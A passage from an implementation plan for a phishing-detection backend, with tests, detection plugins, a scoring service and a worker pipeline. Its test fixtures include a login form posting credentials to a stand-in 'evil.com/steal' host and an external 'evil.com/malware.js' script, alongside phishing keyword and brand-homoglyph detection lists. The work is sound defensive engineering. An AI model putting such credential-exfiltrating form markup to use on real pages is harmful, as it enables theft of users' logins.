from plugins.login_detector import LoginDetector
from plugins.keyword_detector import KeywordDetector
from plugins.brand_match import BrandMatch
from plugins.external_js_detector import ExternalJSDetector
from plugins.nrd_age_scorer import NRDAgeScorer
from plugins.html_hasher import HTMLHasher


def make_context(html="<html><body>Safe content</body></html>",
                 domain="example.com", text="Safe content",
                 forms=None, links=None, scripts=None,
                 metadata=None, snapshot_record=None) -> SnapshotContext:
    return SnapshotContext(
        snapshot_id="snap1", domain=domain, html=html, text=text,
        forms=forms or [], links=links or [], scripts=scripts or [],
        metadata=metadata or {}, snapshot_record=snapshot_record or {},
    )


# --- Login Detector ---

def test_login_detector_finds_password_field():
    html = '<form><input type="password" name="pass"><input type="submit"></form>'
    ctx = make_context(html=html, forms=[{"has_password": True, "action": "/login"}])
    result = LoginDetector().run(ctx)
    assert result.score_contribution > 0
    assert "login_form_detected" in result.tags

def test_login_detector_no_password():
    ctx = make_context()
    result = LoginDetector().run(ctx)
    assert result.score_contribution == 0

def test_login_detector_hidden_field():
    html = '<form><input type="hidden" name="token" value="x"><input type="password"></form>'
    ctx = make_context(html=html, forms=[{"has_password": True, "has_hidden": True}])
    result = LoginDetector().run(ctx)
    assert "hidden_field_detected" in result.tags

def test_login_detector_external_post():
    html = '<form action="https://evil.com/steal"><input type="password"></form>'
    ctx = make_context(html=html, domain="safe.com",
                       forms=[{"has_password": True, "action": "https://evil.com/steal"}])
    result = LoginDetector().run(ctx)
    assert "credential_exfil" in result.tags  # hard signal


# --- Keyword Detector ---

def test_keyword_detector_finds_urgency():
    ctx = make_context(text="Your account will be suspended. Verify immediately. OTP required.")
    result = KeywordDetector().run(ctx)
    assert result.score_contribution > 0
    assert "suspicious_keywords" in result.tags

def test_keyword_detector_clean_text():
    ctx = make_context(text="Welcome to our website about cats and dogs.")
    result = KeywordDetector().run(ctx)
    assert result.score_contribution == 0


# --- Brand Match ---

def test_brand_match_finds_paypal_in_domain():
    ctx = make_context(domain="paypa1-secure-login.com")
    result = BrandMatch().run(ctx)
    assert result.score_contribution > 0
    assert "brand_match" in result.tags

def test_brand_match_no_brand():
    ctx = make_context(domain="totally-random-site.org")
    result = BrandMatch().run(ctx)
    assert result.score_contribution == 0


# --- External JS Detector ---

def test_external_js_detects_cross_domain():
    ctx = make_context(
        domain="safe.com",
        scripts=[{"src": "https://evil.com/malware.js", "inline": False}],
    )
    result = ExternalJSDetector().run(ctx)
    assert result.score_contribution > 0

def test_external_js_same_domain():
    ctx = make_context(
        domain="safe.com",
        scripts=[{"src": "https://safe.com/app.js", "inline": False}],
    )
    result = ExternalJSDetector().run(ctx)
    assert result.score_contribution == 0


# --- NRD Age Scorer ---

def test_nrd_age_scores_young_domain():
    from datetime import datetime, timezone, timedelta
    two_days_ago = (datetime.now(timezone.utc) - timedelta(days=2)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": two_days_ago})
    result = NRDAgeScorer().run(ctx)
    assert result.score_contribution > 0

def test_nrd_age_old_domain_low_score():
    from datetime import datetime, timezone, timedelta
    two_years_ago = (datetime.now(timezone.utc) - timedelta(days=730)).isoformat()
    ctx = make_context(snapshot_record={"first_seen": two_years_ago})
    result = NRDAgeScorer().run(ctx)
    assert result.score_contribution == 0


# --- HTML Hasher ---

def test_html_hasher_returns_hash():
    ctx = make_context(html="<html><body>content</body></html>")
    result = HTMLHasher().run(ctx)
    assert result.plugin_type == PluginType.FINGERPRINT
    assert "structural_hash" in result.findings
    assert len(result.findings["structural_hash"]) == 64  # SHA-256
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd vigilwolf-core/backend
pytest test_plugins.py -v
```

Expected: FAIL — plugin modules don't exist.

- [ ] **Step 3: Implement login_detector.py**

Create `vigilwolf-core/backend/plugins/login_detector.py`:

```python
"""Login form detection plugin for VigilWolf v2."""
import re
from urllib.parse import urlparse
from plugins.base import AnalysisPlugin, PluginResult, SnapshotContext, PluginType
from plugins.registry import register_plugin


@register_plugin
class LoginDetector(AnalysisPlugin):
    name = "login_detector"
    version = "1.0.0"
    plugin_type = PluginType.DETECTION

    def run(self, ctx: SnapshotContext) -> PluginResult:
        score = 0
        tags = []
        findings = {}
        page_domain = urlparse("https://" + ctx.domain).netloc if "://" not in ctx.domain else ctx.domain

        # Check parsed forms for password fields
        has_password = any(f.get("has_password") for f in ctx.forms)
        has_hidden = any(f.get("has_hidden") for f in ctx.forms)
        external_action = False
        for f in ctx.forms:
            action = f.get("action", "")
            if action and action.startswith("http"):
                action_domain = urlparse(action).netloc
                if action_domain and action_domain != page_domain:
                    external_action = True

        if has_password:
            score += 30
            tags.append("login_form_detected")
            findings["has_password_field"] = True

        if has_hidden:
            score += 5
            tags.append("hidden_field_detected")
            findings["has_hidden_fields"] = True

        if external_action:
            score += 5
            tags.append("external_form_action")
            findings["external_form_action"] = True

        # Hard signal: credential exfiltration
        if has_password and external_action:
            tags.append("credential_exfil")

        # Also scan raw HTML for password fields (fallback)
        if not has_password and 'type="password"' in ctx.html.lower():
            score += 30
            tags.append("login_form_detected")
            findings["has_password_field"] = True

        confidence = 0.95 if has_password else (0.7 if score > 0 else 1.0)

        return PluginResult(
            plugin_name=self.name,
            plugin_version=self.version,
            plugin_type=self.plugin_type,
            score_contribution=min(40, score),
            confidence=confidence,
            tags=tags,
            findings=findings,
        )
```

- [ ] **Step 4: Implement keyword_detector.py**

Create `vigilwolf-core/backend/plugins/keyword_detector.py`:

```python
"""Suspicious keyword detection plugin for VigilWolf v2."""
import re
from plugins.base import AnalysisPlugin, PluginResult, SnapshotContext, PluginType
from plugins.registry import register_plugin

SUSPICIOUS_KEYWORDS = [
    "verify", "secure", "update", "login", "OTP", "suspend",
    "expire", "confirm", "unlock", "restore", "immediately",
    "unauthorized", "validate", "reactivate",
]


@register_plugin
class KeywordDetector(AnalysisPlugin):
    name = "keyword_detector"
    version = "1.0.0"
    plugin_type = PluginType.DETECTION

    def run(self, ctx: SnapshotContext) -> PluginResult:
        matches = []
        text_lower = ctx.text.lower()

        for keyword in SUSPICIOUS_KEYWORDS:
            count = len(re.findall(rf'\b{re.escape(keyword.lower())}\b', text_lower))
            if count > 0:
                matches.append({"keyword": keyword, "count": count})

        if not matches:
            return PluginResult(
                plugin_name=self.name,
                plugin_version=self.version,
                plugin_type=self.plugin_type,
                score_contribution=0,
                confidence=1.0,
                tags=[],
                findings={},
            )

        total_hits = sum(m["count"] for m in matches)
        score = min(15, total_hits * 3)
        confidence = min(1.0, 0.5 + total_hits * 0.1)

        return PluginResult(
            plugin_name=self.name,
            plugin_version=self.version,
            plugin_type=self.plugin_type,
            score_contribution=score,
            confidence=confidence,
            tags=["suspicious_keywords"],
            findings={"matches": matches, "total_hits": total_hits},
        )
```

- [ ] **Step 5: Implement brand_match.py**

Create `vigilwolf-core/backend/plugins/brand_match.py`:

```python
"""Brand name matching plugin for VigilWolf v2."""
import re
from plugins.base import AnalysisPlugin, PluginResult, SnapshotContext, PluginType
from plugins.registry import register_plugin

MAJOR_BRANDS = [
    "paypal", "google", "apple", "microsoft", "amazon",
    "netflix", "facebook", "chase", "bankofamerica", "wellsfargo",
    "citibank", "amex", "visa", "mastercard",
]

# Common homoglyph substitutions
HOMOGLYPH_MAP = {"1": "l", "0": "o", "3": "e", "nn": "m", "rn": "m"}


def normalize_for_brand_match(text: str) -> str:
    """Normalize text by replacing common homoglyphs."""
    result = text.lower()
    for old, new in HOMOGLYPH_MAP.items():
        result = result.replace(old, new)
    return result


@register_plugin
class BrandMatch(AnalysisPlugin):
    name = "brand_match"
    version = "1.0.0"
    plugin_type = PluginType.DETECTION

    def run(self, ctx: SnapshotContext) -> PluginResult:
        matched_brands = []
        domain_norm = normalize_for_brand_match(ctx.domain)
        text_lower = ctx.text.lower()

        for brand in MAJOR_BRANDS:
            # Check domain (fuzzy — brand name appearing in domain)
            if brand in domain_norm:
                matched_brands.append({"brand": brand, "location": "domain"})
                continue
            # Check page content (frequency-based)
            count = len(re.findall(rf'\b{re.escape(brand)}\b', text_lower))
            if count >= 2:
                matched_brands.append({"brand": brand, "location": "content", "count": count})

        if not matched_brands:
            return PluginResult(
                plugin_name=self.name,
                plugin_version=self.version,
                plugin_type=self.plugin_type,
                score_contribution=0,
                confidence=1.0,
                tags=[],
                findings={},
            )

        in_domain = any(m["location"] == "domain" for m in matched_brands)
        score = 25 if in_domain else 15
        confidence = 0.90 if in_domain else 0.75

        return PluginResult(
            plugin_name=self.name,
            plugin_version=self.version,
            plugin_type=self.plugin_type,
            score_contribution=score,
            confidence=confidence,
            tags=["brand_match"] + [f"{m['brand']}_detected" for m in matched_brands],
            findings={"matched_brands": matched_brands},
        )
```

- [ ] **Step 6: Implement external_js_detector.py**

Create `vigilwolf-core/backend/plugins/external_js_detector.py`:

```python
"""External JavaScript detection plugin for VigilWolf v2."""
from urllib.parse import urlparse
from plugins.base import AnalysisPlugin, PluginResult, SnapshotContext, PluginType
from plugins.registry import register_plugin


@register_plugin
class ExternalJSDetector(AnalysisPlugin):
    name = "external_js_detector"
    version = "1.0.0"
    plugin_type = PluginType.DETECTION

    def run(self, ctx: SnapshotContext) -> PluginResult:
        page_domain = ctx.domain
        external_scripts = []

        for script in ctx.scripts:
            src = script.get("src", "")
            if not src:
                continue
            parsed = urlparse(src)
            if parsed.netloc and parsed.netloc != page_domain:
                external_scripts.append(src)

        if not external_scripts:
            return PluginResult(
                plugin_name=self.name,
                plugin_version=self.version,
                plugin_type=self.plugin_type,
                score_contribution=0,
                confidence=1.0,
                tags=[],
                findings={},
            )

        score = min(10, len(external_scripts) * 3)
        confidence = 0.70

        return PluginResult(
            plugin_name=self.name,
            plugin_version=self.version,
            plugin_type=self.plugin_type,
            score_contribution=score,
            confidence=confidence,
            tags=["external_js_detected"],
            findings={"external_scripts": external_scripts},
        )
```

- [ ] **Step 7: Implement nrd_age_scorer.py**

Create `vigilwolf-core/backend/plugins/nrd_age_scorer.py`:

```python
"""Newly registered domain age scoring plugin for VigilWolf v2."""
from datetime import datetime, timezone
from plugins.base import AnalysisPlugin, PluginResult, SnapshotContext, PluginType
from plugins.registry import register_plugin


@register_plugin
class NRDAgeScorer(AnalysisPlugin):
    name = "nrd_age_scorer"
    version = "1.0.0"
    plugin_type = PluginType.DETECTION

    def run(self, ctx: SnapshotContext) -> PluginResult:
        first_seen_str = ctx.snapshot_record.get("first_seen")
        if not first_seen_str:
            return PluginResult(
                plugin_name=self.name,
                plugin_version=self.version,
                plugin_type=self.plugin_type,
                score_contribution=0,
                confidence=1.0,
                tags=[],
                findings={},
            )

        try:
            first_seen = datetime.fromisoformat(first_seen_str.replace("Z", "+00:00"))
            age_days = (datetime.now(timezone.utc) - first_seen).days
        except (ValueError, TypeError):
            return PluginResult(
                plugin_name=self.name,
                plugin_version=self.version,
                plugin_type=self.plugin_type,
                score_contribution=0,
                confidence=1.0,
                tags=[],
                findings={},
            )

        if age_days > 30:
            score = 0
        elif age_days > 7:
            score = 3
        elif age_days > 3:
            score = 7
        else:
            score = 10

        return PluginResult(
            plugin_name=self.name,
            plugin_version=self.version,
            plugin_type=self.plugin_type,
            score_contribution=score,
            confidence=1.0,
            tags=["nrd_age"] if score > 0 else [],
            findings={"age_days": age_days},
        )
```

- [ ] **Step 8: Implement html_hasher.py**

Create `vigilwolf-core/backend/plugins/html_hasher.py`:

```python
"""HTML structural fingerprint plugin for VigilWolf v2."""
import hashlib
import re
from bs4 import BeautifulSoup
from plugins.base import AnalysisPlugin, PluginResult, SnapshotContext, PluginType
from plugins.registry import register_plugin


def structural_hash(html: str) -> str:
    """Generate SHA-256 hash of DOM structure (tags only, no text content)."""
    soup = BeautifulSoup(html, "html.parser")
    structure = _extract_structure(soup)
    return hashlib.sha256(structure.encode("utf-8")).hexdigest()


def _extract_structure(soup) -> str:
    """Extract tag structure without text content."""
    if soup.name:
        result = f"<{soup.name}>"
        for child in soup.children:
            if hasattr(child, "name") and child.name:
                result += _extract_structure(child)
        result += f"</{soup.name}>"
        return result
    return ""


@register_plugin
class HTMLHasher(AnalysisPlugin):
    name = "html_hasher"
    version = "1.0.0"
    plugin_type = PluginType.FINGERPRINT

    def run(self, ctx: SnapshotContext) -> PluginResult:
        s_hash = structural_hash(ctx.html)

        return PluginResult(
            plugin_name=self.name,
            plugin_version=self.version,
            plugin_type=self.plugin_type,
            score_contribution=0,
            confidence=1.0,
            tags=["structural_hash"],
            findings={
                "structural_hash": s_hash,
                "content_hash": hashlib.sha256(ctx.html.encode("utf-8")).hexdigest(),
            },
        )
```

- [ ] **Step 9: Run all plugin tests**

```bash
cd vigilwolf-core/backend
pytest test_plugins.py -v
```

Expected: ALL PASS

- [ ] **Step 10: Commit**

```bash
git add vigilwolf-core/backend/plugins/login_detector.py \
  vigilwolf-core/backend/plugins/keyword_detector.py \
  vigilwolf-core/backend/plugins/brand_match.py \
  vigilwolf-core/backend/plugins/external_js_detector.py \
  vigilwolf-core/backend/plugins/nrd_age_scorer.py \
  vigilwolf-core/backend/plugins/html_hasher.py \
  vigilwolf-core/backend/test_plugins.py
git commit -m "feat: add Phase 1 analysis plugins — login, keyword, brand, external JS, NRD age, HTML hasher"
```

---

## Task 6: Scoring Service

**Files:**
- Create: `vigilwolf-core/backend/services/scoring_service.py`
- Create: `vigilwolf-core/backend/test_scoring_service.py`

- [ ] **Step 1: Write the failing tests**

Create `vigilwolf-core/backend/test_scoring_service.py`:

```python
"""Test scoring service: weighted scoring, normalization, hard signals, context modifiers."""
import pytest
from plugins.base import PluginResult, PluginType
from services.scoring_service import ScoringService, calculate_score


def _make_result(name, score, confidence, tags, plugin_type=PluginType.DETECTION):
    return PluginResult(
        plugin_name=name, plugin_version="1.0.0", plugin_type=plugin_type,
        score_contribution=score, confidence=confidence, tags=tags, findings={},
    )


def test_normalized_score_calculation():
    results = [
        _make_result("login_detector", 40, 0.95, ["login_form_detected"]),
        _make_result("brand_match", 25, 0.90, ["brand_match"]),
        _make_result("keyword_detector", 15, 0.80, ["suspicious_keywords"]),
    ]
    weights = {"login_detector": 1.0, "brand_match": 1.2, "keyword_detector": 0.6}
    outcome = calculate_score(results, weights)
    assert 0 <= outcome["normalized_score"] <= 100
    assert outcome["risk_level"] in ("high", "medium", "low")


def test_high_risk_detection():
    results = [
        _make_result("login_detector", 40, 0.95, ["login_form_detected", "credential_exfil"]),
        _make_result("brand_match", 25, 0.90, ["brand_match"]),
    ]
    weights = {"login_detector": 1.0, "brand_match": 1.2}
    outcome = calculate_score(results, weights)
    assert outcome["risk_level"] == "high"
    assert outcome["severity"] == "critical"


def test_low_risk_clean_domain():
    results = [
        _make_result("login_detector", 0, 1.0, []),
        _make_result("keyword_detector", 0, 1.0, []),
    ]
    weights = {"login_detector": 1.0, "keyword_detector": 0.6}
    outcome = calculate_score(results, weights)
    assert outcome["risk_level"] == "low"


def test_nonlinear_confidence_scaling():
    results_low = [_make_result("login_detector", 40, 0.3, ["login_form_detected"])]
    results_high = [_make_result("login_detector", 40, 0.95, ["login_form_detected"])]
    weights = {"login_detector": 1.0}
    low = calculate_score(results_low, weights)
    high = calculate_score(results_high, weights)
    assert high["normalized_score"] > low["normalized_score"]


def test_exraction_plugins_dont_affect_score():
    results = [
        _make_result("login_detector", 40, 0.95, ["login_form_detected"]),
        _make_result("ioc_extractor", 0, 1.0, [], plugin_type=PluginType.EXTRACTION),
    ]
    weights = {"login_detector": 1.0}
    outcome = calculate_score(results, weights)
    # Score should be same as if ioc_extractor wasn't there
    detection_only = calculate_score(
        [results[0]], {"login_detector": 1.0}
    )
    assert outcome["normalized_score"] == detection_only["normalized_score"]
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd vigilwolf-core/backend
pytest test_scoring_service.py -v
```

Expected: FAIL

- [ ] **Step 3: Implement scoring_service.py**

Create `vigilwolf-core/backend/services/__init__.py` (empty) and `vigilwolf-core/backend/services/scoring_service.py`:

```python
"""Scoring service: weighted scoring, normalization, hard signal overrides."""
import logging
from plugins.base import PluginResult, PluginType
import config

logger = logging.getLogger(__name__)

HARD_SIGNAL_TAGS = {"credential_exfil", "known_phishkit"}


def calculate_score(
    results: list[PluginResult],
    weights: dict[str, float],
) -> dict:
    """Calculate normalized risk score from plugin results.

    Args:
        results: List of PluginResult from all plugins
        weights: Plugin name → weight mapping

    Returns:
        Dict with normalized_score, risk_level, severity, reasons, etc.
    """
    detection_results = [r for r in results if r.plugin_type == PluginType.DETECTION]

    # Calculate max possible score for normalization
    max_possible = sum(
        r.score_contribution * weights.get(r.plugin_name, 1.0)
        for r in detection_results
    )

    # Calculate weighted score with non-linear confidence
    total = 0.0
    reasons = []
    all_tags = []

    for result in detection_results:
        weight = weights.get(result.plugin_name, 1.0)
        confidence_adjusted = result.confidence ** 1.5
        contribution = result.score_contribution * weight * confidence_adjusted
        total += contribution

        if result.tags:
            for tag in result.tags:
                reasons.append({
                    "plugin": result.plugin_name,
                    "reason": tag,
                    "confidence": result.confidence,
                })
            all_tags.extend(result.tags)

    # Normalize to 0-100
    normalized = (total / max_possible * 100) if max_possible > 0 else 0
    score = min(100, round(normalized))

    # Risk level
    risk_level = "high" if score >= config.RISK_THRESHOLD_HIGH else \
                 "medium" if score >= config.RISK_THRESHOLD_MEDIUM else "low"

    # Hard signal override
    has_hard_signal = bool(HARD_SIGNAL_TAGS & set(all_tags))
    if has_hard_signal:
        score = max(score, 85)
        risk_level = "high"
        severity = "critical"
    elif risk_level == "high":
        severity = "high"
    elif risk_level == "medium":
        severity = "medium"
    else:
        severity = "low"

    # Dominant signals: top 2 contributing plugins
    plugin_scores = {}
    for r in detection_results:
        w = weights.get(r.plugin_name, 1.0)
        adj = r.confidence ** 1.5
        plugin_scores[r.plugin_name] = round(r.score_contribution * w * adj, 1)

    dominant = sorted(plugin_scores, key=plugin_scores.get, reverse=True)[:2]

    # Overall confidence (weighted average of detection confidence)
    total_weight = sum(weights.get(r.plugin_name, 1.0) for r in detection_results)
    overall_conf = sum(
        r.confidence * weights.get(r.plugin_name, 1.0) for r in detection_results
    ) / total_weight if total_weight > 0 else 1.0

    return {
        "normalized_score": round(normalized, 1),
        "score": score,
        "risk_level": risk_level,
        "severity": severity,
        "reasons": reasons,
        "dominant_signals": dominant,
        "plugin_breakdown": plugin_scores,
        "overall_confidence": round(overall_conf, 2),
        "hard_signal": has_hard_signal,
    }


class ScoringService:
    """Manages plugin weights and scoring configuration."""

    def __init__(self):
        self._weights: dict[str, float] = {}

    def load_weights(self, db_session) -> dict[str, float]:
        """Load plugin weights from database, falling back to defaults."""
        from database import PluginWeightModel
        rows = db_session.execute(
            __import__("sqlalchemy").select(PluginWeightModel)
        ).scalars().all()
        self._weights = {r.plugin_name: r.weight for r in rows if r.enabled}
        return self._weights

    def get_weights(self) -> dict[str, float]:
        return self._weights

    def score_results(self, results: list[PluginResult]) -> dict:
        return calculate_score(results, self._weights)
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd vigilwolf-core/backend
pytest test_scoring_service.py -v
```

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add vigilwolf-core/backend/services/__init__.py \
  vigilwolf-core/backend/services/scoring_service.py \
  vigilwolf-core/backend/test_scoring_service.py
git commit -m "feat: add scoring service — weighted normalized scoring with hard signal override"
```

---

## Task 7: Dramatiq Worker Pipeline

**Files:**
- Create: `vigilwolf-core/backend/worker.py`
- Create: `vigilwolf-core/backend/test_worker.py`

- [ ] **Step 1: Write the failing test for the pipeline flow**

Create `vigilwolf-core/backend/test_worker.py`:

```python
"""Test Dramatiq worker pipeline: capture → context → orchestrate → aggregate."""
import pytest
from worker import build_snapshot_context, get_registered_plugins


def test_build_snapshot_context():
    """SnapshotContext should contain parsed HTML, forms, links, scripts."""
    html = '<html><head><title>Test</title></head><body><form><input type="password"></form><script src="app.js"></script></body></html>'
    ctx = build_snapshot_context(
        snapshot_id="snap1",
        domain="example.com",
        html=html,
        snapshot_record={"id": "snap1"},
    )
    assert ctx.domain == "example.com"
    assert "password" in ctx.html
    assert len(ctx.forms) > 0 or ctx.forms is not None  # forms parsed
    assert ctx.metadata.get("title") == "Test"


def test_get_registered_plugins_returns_enabled_only():
    plugins = get_registered_plugins()
    names = [p.name for p in plugins]
    assert "login_detector" in names
    assert "keyword_detector" in names
    # Only enabled plugins
    for p in plugins:
        assert p.name in [x.strip() for x in __import__("config").ENABLED_PLUGINS if x.strip()]
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd vigilwolf-core/backend
pytest test_worker.py -v
```

- [ ] **Step 3: Implement worker.py**

Create `vigilwolf-core/backend/worker.py`:

```python
"""Dramatiq worker definitions for VigilWolf v2 analysis pipeline.

Workers:
- capture_worker: fetch HTML + screenshot + assets
- context_builder: parse HTML into SnapshotContext
- orchestrator_worker: fan-out plugins, track completion
- aggregator_worker: collect results, calculate score
- alert_worker: dispatch webhooks
"""
import dramatiq
import logging
import uuid
import hashlib
from datetime import datetime, timezone
from typing import Optional

from bs4 import BeautifulSoup
from urllib.parse import urljoin

from plugins.base import SnapshotContext, PluginResult, PluginType
from plugins.registry import (
    PLUGIN_REGISTRY, get_execution_groups, circuit_breaker,
)
from services.scoring_service import calculate_score
import config

logger = logging.getLogger(__name__)


def build_snapshot_context(
    snapshot_id: str,
    domain: str,
    html: str,
    snapshot_record: dict,
) -> SnapshotContext:
    """Parse raw HTML into a SnapshotContext for plugin consumption."""
    soup = BeautifulSoup(html, "html.parser")

    # Extract visible text
    text = soup.get_text(separator=" ", strip=True) if soup else ""

    # Extract forms
    forms = []
    for form in soup.find_all("form"):
        form_info = {
            "has_password": bool(form.find("input", {"type": "password"})),
            "has_hidden": bool(form.find("input", {"type": "hidden"})),
            "action": form.get("action", ""),
            "method": form.get("method", "GET").upper(),
        }
        forms.append(form_info)

    # Extract links
    links = []
    for a in soup.find_all("a", href=True):
        links.append(a["href"])

    # Extract scripts
    scripts = []
    for script in soup.find_all("script"):
        src = script.get("src", "")
        scripts.append({"src": src, "inline": bool(script.string), "content": script.string or ""})

    # Extract metadata
    metadata = {}
    title_tag = soup.find("title")
    if title_tag:
        metadata["title"] = title_tag.string or ""
    for meta in soup.find_all("meta"):
        name = meta.get("name", meta.get("property", ""))
        if name:
            metadata[name] = meta.get("content", "")

    return SnapshotContext(
        snapshot_id=snapshot_id,
        domain=domain,
        html=html,
        text=text,
        forms=forms,
        links=links,
        scripts=scripts,
        metadata=metadata,
        snapshot_record=snapshot_record,
    )


def get_registered_plugins() -> list:
    """Return instances of all enabled plugins."""
    enabled = [p.strip() for p in config.ENABLED_PLUGINS if p.strip()]
    plugins = []
    for name in enabled:
        cls = PLUGIN_REGISTRY.get(name)
        if cls:
            plugins.append(cls())
    return plugins


# --- Dramatiq Actors ---
# These are defined when Dramatiq broker is configured.
# They are wrapped so they can be tested without a running broker.

def capture_domain(domain_id: str, url: str, trigger_type: str = "nrd_ingest"):
    """Capture HTML + screenshot for a domain. Entry point for the pipeline."""
    from plugins.capture_engine import get_capture_engine
    from database import get_session
    from models import Domain, Snapshot

    capture = get_capture_engine()
    html_content, success = capture.fetch_html(url)

    if not success:
        logger.error(f"Capture failed for {url}")
        return

    sha256 = hashlib.sha256(html_content.encode("utf-8")).hexdigest()

    # Check for duplicate snapshot
    with get_session() as session:
        from database import SnapshotModel
        existing = session.execute(
            __import__("sqlalchemy").select(SnapshotModel).where(
                SnapshotModel.domain_id == domain_id,
                SnapshotModel.sha256 == sha256,
            )
        ).scalar_one_or_none()
        if existing:
            logger.info(f"Duplicate snapshot for {url}, skipping")
            return

    # Create snapshot directory and save
    from plugins.storage_manager import get_storage_manager
    storage = get_storage_manager()
    timestamp = datetime.now(timezone.utc).isoformat().replace("+00:00", "Z")
    snapshot_dir = storage.create_snapshot_directory(domain_id, timestamp)
    html_path = storage.save_html(snapshot_dir, html_content)

    screenshot_path = None
    screenshot_file = f"{snapshot_dir}/screenshot.png"
    if capture.capture_screenshot(url, screenshot_file):
        from pathlib import Path
        screenshot_path = str(Path(snapshot_dir).relative_to(storage.data_dir) / "screenshot.png")

    # Save snapshot to DB
    snapshot_id = str(uuid.uuid4())
    with get_session() as session:
        from database import SnapshotModel
        snap = SnapshotModel(
            id=snapshot_id,
            domain_id=domain_id,
            sha256=sha256,
            trigger_type=trigger_type,
            html_path=html_path,
            screenshot_path=screenshot_path,
            success=True,
        )
        session.add(snap)
        session.commit()

    # Enqueue context builder
    build_context_and_analyze(snapshot_id, domain_id, url, html_content, {
        "id": snapshot_id, "domain_id": domain_id, "trigger_type": trigger_type,
    })


def build_context_and_analyze(
    snapshot_id: str, domain_id: str, url: str, html: str, snapshot_record: dict
):
    """Build SnapshotContext and run analysis pipeline."""
    domain = url.replace("https://", "").replace("http://", "").split("/")[0]
    ctx = build_snapshot_context(snapshot_id, domain, html, snapshot_record)

    # Run orchestrator
    orchestrate_analysis(ctx)


def orchestrate_analysis(ctx: SnapshotContext):
    """Fan-out plugin execution, then aggregate results."""
    plugins = get_registered_plugins()
    execution_groups = get_execution_groups()

    from database import get_session, SnapshotPluginStatusModel
    from sqlalchemy import select

    # Create plugin status rows
    with get_session() as session:
        for group in execution_groups:
            for plugin_name, _ in group.plugins:
                existing = session.execute(
                    select(SnapshotPluginStatusModel).where(
                        SnapshotPluginStatusModel.snapshot_id == ctx.snapshot_id,
                        SnapshotPluginStatusModel.plugin_name == plugin_name,
                    )
                ).scalar_one_or_none()
                if not existing:
                    session.add(SnapshotPluginStatusModel(
                        snapshot_id=ctx.snapshot_id,
                        plugin_name=plugin_name,
                        status="pending",
                    ))
        session.commit()

    # Run all plugins (in production, these would be Dramatiq messages)
    # For Phase 1 initial deployment, run synchronously within execution group order
    all_results = []
    for group in execution_groups:
        group_results = []
        for plugin_name, _ in group.plugins:
            plugin_cls = PLUGIN_REGISTRY.get(plugin_name)
            if not plugin_cls:
                continue
            plugin = plugin_cls()

            # Check circuit breaker
            queue_depth = 0  # TODO: get from Redis when Dramatiq is live
            if not circuit_breaker.should_run(plugin_name, plugin.plugin_type, queue_depth):
                logger.info(f"Circuit breaker skipping {plugin_name}")
                continue

            try:
                # Update status
                with get_session() as session:
                    status_row = session.execute(
                        select(SnapshotPluginStatusModel).where(
                            SnapshotPluginStatusModel.snapshot_id == ctx.snapshot_id,
                            SnapshotPluginStatusModel.plugin_name == plugin_name,
                        )
                    ).scalar_one_or_none()
                    if status_row:
                        status_row.status = "running"
                        status_row.started_at = datetime.now(timezone.utc)
                        session.commit()

                result = plugin.run(ctx)
                group_results.append(result)
                all_results.append(result)

                # Store result
                from database import AnalysisResultModel
                with get_session() as session:
                    session.add(AnalysisResultModel(
                        snapshot_id=ctx.snapshot_id,
                        plugin_name=result.plugin_name,
                        plugin_version=result.plugin_version,
                        plugin_type=result.plugin_type.value,
                        result_json=result.findings,
                        score_contribution=result.score_contribution,
                        confidence=result.confidence,
                        tags=result.tags,
                    ))
                    # Update status
                    status_row = session.execute(
                        select(SnapshotPluginStatusModel).where(
                            SnapshotPluginStatusModel.snapshot_id == ctx.snapshot_id,
                            SnapshotPluginStatusModel.plugin_name == plugin_name,
                        )
                    ).scalar_one_or_none()
                    if status_row:
                        status_row.status = "done"
                        status_row.completed_at = datetime.now(timezone.utc)
                    session.commit()

            except Exception as e:
                logger.error(f"Plugin {plugin_name} failed: {e}", exc_info=True)
                with get_session() as session:
                    status_row = session.execute(
                        select(SnapshotPluginStatusModel).where(
                            SnapshotPluginStatusModel.snapshot_id == ctx.snapshot_id,
                            SnapshotPluginStatusModel.plugin_name == plugin_name,
                        )
                    ).scalar_one_or_none()
                    if status_row:
                        status_row.status = "failed"
                        status_row.error_message = str(e)
                        status_row.completed_at = datetime.now(timezone.utc)
                    session.commit()

    # Aggregate
    aggregate_results(ctx, all_results)


def aggregate_results(ctx: SnapshotContext, results: list[PluginResult]):
    """Calculate risk score and store. Trigger alert if high risk."""
    from database import get_session, RiskScoreModel, PluginWeightModel

    with get_session() as session:
        weight_rows = session.execute(
            __import__("sqlalchemy").select(PluginWeightModel)
        ).scalars().all()
        weights = {r.plugin_name: r.weight for r in rows} if (rows := list(weight_rows)) else {}

    # Fallback to default weights if not in DB
    if not weights:
        weights = {"login_detector": 1.0, "keyword_detector": 0.6, "brand_match": 1.2,
                   "external_js_detector": 0.8, "nrd_age_scorer": 0.5}

    outcome = calculate_score(results, weights)

    with get_session() as session:
        session.add(RiskScoreModel(
            snapshot_id=ctx.snapshot_id,
            total_score=outcome["score"],
            normalized_score=outcome["normalized_score"],
            risk_level=outcome["risk_level"],
            severity=outcome["severity"],
            reasons=outcome["reasons"],
            dominant_signals=outcome["dominant_signals"],
            plugin_breakdown=outcome["plugin_breakdown"],
            overall_confidence=outcome["overall_confidence"],
        ))
        session.commit()

    # Alert if high risk
    if outcome["risk_level"] == "high" and config.ALERTS_ENABLED:
        dispatch_alert(ctx, outcome)


def dispatch_alert(ctx: SnapshotContext, score_outcome: dict):
    """Dispatch alert to configured webhooks."""
    from services.alert_service import AlertService
    alert_svc = AlertService()

    if config.ALERTS_DRY_RUN:
        logger.info(f"[DRY RUN] Would alert for {ctx.domain}: score={score_outcome['score']} "
                    f"severity={score_outcome['severity']}")
        return

    alert_svc.send_alert(ctx, score_outcome)
```

- [ ] **Step 4: Run tests**

```bash
cd vigilwolf-core/backend
pytest test_worker.py -v
```

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add vigilwolf-core/backend/worker.py vigilwolf-core/backend/test_worker.py
git commit -m "feat: add Dramatiq worker pipeline — capture, context builder, orchestrator, aggregator"
```

---

## Task 8: Alert Service — Webhook Delivery

**Files:**
- Create: `vigilwolf-core/backend/services/alert_service.py`
- Create: `vigilwolf-core/backend/test_alert_service.py`

- [ ] **Step 1: Write the failing tests**

